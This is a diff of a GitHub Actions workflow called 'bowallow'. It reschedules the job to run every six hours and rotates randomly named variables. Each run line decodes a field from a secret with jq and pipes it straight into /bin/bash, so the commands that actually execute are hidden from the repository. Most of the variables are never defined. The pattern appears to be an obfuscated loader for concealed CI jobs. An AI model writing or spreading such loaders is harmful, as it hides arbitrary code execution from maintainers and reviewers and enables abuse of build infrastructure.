@@ -3,8 +3,7 @@ name: bowallow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
-
+    - cron: '54 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,17 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: bowallow
         env:
-          hhosb40: ${{ secrets.hhosb40 }}
+          epz92585: ${{ secrets.epz92585 }}
         run: |
-          echo $hhosb40 | jq -r .keth518 | /bin/bash
-          echo $z11241 | jq -r .jpzu1 | /bin/bash
-          echo $ejb1 | jq -r .hj772 | /bin/bash
-          echo $pir6407 | jq -r .k26682 | /bin/bash
-          echo $quhaw5 | jq -r .ktfzn0311 | /bin/bash
-          echo $kyf2220 | jq -r .sr96 | /bin/bash
-          echo $nmq0 | jq -r .yjg88870 | /bin/bash
-          echo $q057 | jq -r .ytw47436 | /bin/bash
-          echo $br9865 | jq -r .v870 | /bin/bash
-          echo $tflho5997 | jq -r .vvg15220 | /bin/bash
-          echo $lsdc6167 | jq -r .vkfdz11221 | /bin/bash
+          echo $epz92585 | jq -r .tlwuw2277 | /bin/bash
+          echo $f05154 | jq -r .cleta7 | /bin/bash
+          echo $k6 | jq -r .h6 | /bin/bash
+          echo $iabz36706 | jq -r .lkc80793 | /bin/bash
+          echo $zeiae04779 | jq -r .psun9 | /bin/bash
+          echo $jdzxc8903 | jq -r .n1162 | /bin/bash
+          echo $ya48 | jq -r .fda7 | /bin/bash
+          echo $jqfdh63873 | jq -r .n79 | /bin/bash
+          echo $jgx53821 | jq -r .s447 | /bin/bash
+          echo $ydga86 | jq -r .eabgx5028 | /bin/bash
+          echo $qzilh0 | jq -r .mddop761 | /bin/bash
+          echo $tkcqm85 | jq -r .vig8 | /bin/bash
 
